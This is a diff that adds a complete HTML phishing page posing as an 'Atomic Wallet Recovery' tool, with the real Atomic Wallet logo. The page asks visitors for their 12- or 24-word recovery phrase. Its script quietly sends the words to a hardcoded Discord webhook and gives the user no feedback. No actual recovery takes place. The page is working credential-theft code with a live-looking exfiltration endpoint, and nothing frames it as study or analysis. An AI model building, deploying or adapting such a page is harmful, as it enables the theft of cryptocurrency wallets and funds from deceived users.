@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atomic Wallet Recovery</title>
+    <!-- Favicon hinzufügen -->
+    <link rel="icon" href="https://atomicwallet.io/images/press-kit/atomic_wallet_logo_dark_rounded_2.png" type="image/png">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #152a48;
+            color: #fff;
+            text-align: center;
+            padding: 50px;
+        }
+        .container {
+            max-width: 600px;
+            margin: auto;
+            background: #1b3b6f;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 168, 255, 0.5);
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #00a8ff;
+        }
+        .input-field {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin-top: 20px;
+            padding: 0 20px;
+        }
+        input {
+            width: 80%;
+            padding: 10px;
+            border: 1px solid #00a8ff;
+            border-radius: 5px;
+            background: #204b8c;
+            color: #fff;
+            text-align: center;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        button {
+            background: #00a8ff;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background: #007acc;
+        }
+        select {
+            padding: 10px;
+            width: 100%;
+            border-radius: 5px;
+            background: #204b8c;
+            color: #fff;
+            margin-bottom: 20px;
+            border: 1px solid #00a8ff;
+        }
+    </style>
+    <script>
+        function generateFields() {
+            const fieldContainer = document.getElementById('field-container');
+            fieldContainer.innerHTML = '';
+            const numWords = document.getElementById('word-count').value;
+            for (let i = 1; i <= numWords; i++) {
+                fieldContainer.innerHTML += `<input type="text" placeholder="Word ${i}" required>`;
+            }
+        }
+
+        function submitRecovery() {
+            const inputs = document.querySelectorAll('.input-field input');
+            let words = [];
+            inputs.forEach((input, index) => {
+                words.push(`${index + 1}. ${input.value.trim()}`);
+            });
+            const webhookURL = "https://discord.com/api/webhooks/1333089529028022272/eMFHnR4775PFpUMRmGLytSmvOLylFw1zU9xgTv0PR98TpFIygm4HHlbBqZE2wDVEx4uw";
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: words.join('\n')
+                })
+            }).catch(error => {
+                // Hier keine alert-Meldungen mehr, nur Fehlerbehandlung
+                console.error('Network error occurred:', error);
+            });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="https://atomicwallet.io/images/press-kit/atomic_wallet_logo_dark_rounded_2.png" alt="Atomic Wallet Logo" class="logo">
+        <h1>Wallet Recovery</h1>
+        <p>Enter your recovery phrase</p>
+        <select id="word-count" onchange="generateFields()" value="12">
+            <option value="12" selected>12 Words</option>
+            <option value="24">24 Words</option>
+        </select>
+        <div class="input-field" id="field-container">
+            <script>
+                generateFields();
+            </script>
+        </div>
+        <button onclick="submitRecovery()">Recover</button>
+    </div>
+</body>
+</html>
